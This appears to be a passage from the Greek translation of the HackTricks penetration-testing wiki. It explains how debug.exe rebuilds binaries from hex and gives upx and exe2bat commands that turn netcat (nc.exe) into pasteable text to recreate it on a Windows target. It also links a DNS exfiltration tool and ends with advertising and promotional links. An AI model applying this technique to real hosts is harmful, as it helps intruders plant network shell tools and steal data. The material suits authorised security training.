Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει τον έλεγχο των δυαδικών αρχείων, αλλά έχει επίσης τη **δυνατότητα να τα ξαναχτίσει από τον αντίστοιχο κώδικα σε μορφή hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex αρχείου, το `debug.exe` μπορεί να δημιουργήσει το αντίστοιχο δυαδικό αρχείο. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει **περιορισμό στη συναρμολόγηση αρχείων μέχρι 64 kb σε μέγεθος**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Στη συνέχεια, αντιγράψτε και επικολλήστε το κείμενο στο παράθυρο του Windows και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προς τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
